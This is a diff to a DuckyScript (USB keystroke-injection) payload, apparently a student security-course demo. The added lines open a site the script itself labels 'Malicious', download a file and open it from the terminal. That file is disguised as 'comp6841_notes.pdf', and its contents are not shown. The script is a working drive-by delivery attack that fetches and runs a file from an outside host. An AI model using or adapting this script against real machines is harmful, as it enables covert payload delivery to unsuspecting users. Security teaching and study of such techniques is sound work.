@@ -21,6 +21,9 @@ REM Check if it already exists, if yes, delete it
 STRING erase /Q "Downloads\hello.txt"
 ENTER
 DELAY 100
+STRING erase /Q "Downloads\comp6841_notes.pdf"
+ENTER
+DELAY 100
 
 REM Open notepad
 STRING notepad "Downloads\hello.txt"
@@ -53,15 +56,45 @@ STRING https://google.com
 ENTER
 DELAY 1000
 
+REM Go To My 'Malicious' Site
+GUI r
+DELAY 100
+STRING https://n-tandiono.github.io/unsafe
+DELAY 2000
+
+REM Download File
+TAB
+ENTER
+DELAY 1000
+
+REM File Downloaded Let's go to a new site
+TAB
+REPEAT 3
+ENTER
+DELAY 2000
+
 REM Close Website
 ALT-TAB
-DELAY 1000
+DELAY 100
 
 REM Back in Terminal
 REM Echo Hello World
-STRING echo 'Hello, World!'
+STRING echo Hello, World!
+ENTER
+DELAY 100
+
+REM Open File
+STRING Downloads\comp6841_notes.pdf
 ENTER
 DELAY 1000
+
+REM Possible Ask for Method
+ENTER
+DELAY 1000
+
+REM Move Back to Terminal
+ALT-TAB
+ENTER
 
 REM Exit Terminal
 STRING exit
